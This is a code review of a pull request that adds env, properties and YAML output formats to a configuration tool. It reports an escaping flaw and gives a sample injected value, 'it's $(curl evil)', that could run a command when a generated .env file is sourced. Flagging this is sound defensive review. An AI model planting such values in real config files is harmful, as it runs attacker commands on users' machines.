# Review of PR #136: [Flat output formats for configurations (424-104)](https://github.com/akobr/mono.me/pull/136)

Reviewer: Harry · Review date: 2026-10-27

**Verdict: needs discussion.** The design is careful and well tested, with no hard blockers. Before it ships to CI users, the env format's handling of `$` and backticks should be settled.

The PR is stacked on #135 and isn't a draft. It changes 401 files, but 285 of them are generated TypeScript files where only the spec-version header changed. The only check that ran was CodeRabbit, which skipped because the base isn't the default branch. There's no .NET CI workflow, so the "all tests pass" claim isn't verified anywhere.

## Important

1. **Env output can run commands.** In `EnvRenderer.cs`, `Quote` (about lines 78–100) switches to double quotes for values with `'`, `\` or a newline. It escapes `\ " \n \r \t` but not `$` or backticks. People `source` .env files in bash, and Docker Compose and python-dotenv expand `${VAR}` in double quotes. So a value like `it's $(curl evil)` gets mangled at best and executed at worst. Escape `$` and backticks inside double quotes, or refuse such values, or at least document that the file must not be sourced. `--github-env` isn't affected, because it uses heredocs.
2. **Env names may contain `.` and `-`.** A shell can't reference those, and with `--github-env` they become job variables no later bash step can read. Refuse them for `--github-env` or warn with the paths.
3. **Source-breaking SDK change.** The generated `GetConfigurationAsync` and `GetResolvedConfigurationAsync` now take `string format` before `string if_None_Match`, so every positional caller needs another `null`. Declare `format` after `If-None-Match`, or call the break out in the changelog and version bump.
4. **Conditional reads still do the full format.** In `ConfigurationHttp.cs`, the content is formatted before the `If-None-Match` comparison, so every 304 pays for canonicalizing and rendering. A concrete tag is only issued after a successful format, so compare those first and format up front only for `*` or no match. A 30-second poller would notice.
5. **A failing resolved read repeats its work.** A CI job retrying a broken `?format=env` re-resolves, meters and audits, including secret reads, on every attempt. Cache the failure under the same manifest, or fail fast on the cheap effective document.

## Nits

- `JObjectConverter.cs` copies the content three times. Write the `JsonDocument` straight to the outer writer.
- `PropertiesRenderer.cs` `CheckGaps` and `HasValue` can go quadratic on deeply nested arrays.
- `YamlRenderer.cs` writes `1E+20`, which a YAML 1.1 reader like PyYAML reads as a string. Write `1.0e+20`.
- The recursive walkers have no depth guard of their own. Safe today because ingestion caps documents at 64 levels, but it deserves a comment.
- `ConfigGetCommand.Validate` duplicates the prefix check in `ConfigurationFormatter`. Expose one helper.
- `--env-prefix APP` without a trailing `_` gives `APPDB__HOST`. Warn, or add the `_`.
- The CLI returns `ERROR_WRONG_INPUT` for runtime IO failures too. Use a distinct exit code.
- On Windows, `--export` has no owner-only ACL. Mention it in the README, since the file may hold secrets.
- In `action.yml`, pin `actions/setup-dotnet@v6` to a commit SHA, because the action handles secrets. `--add-source` also still consults the default feeds.
- In bound mode, a secret interpolated into a larger string, like a connection string, masks the whole value but not the secret substring alone. Worth a README line.

## Good

Validation errors name the JSON path and never the value, ETags account for the format and formatter version, and the `--github-env` path is well designed: it computes everything before writing, emits masks before values, uses random heredoc delimiters, and keeps a reserved-name denylist. The action passes every input through `env:`, and there are around 381 new tests.
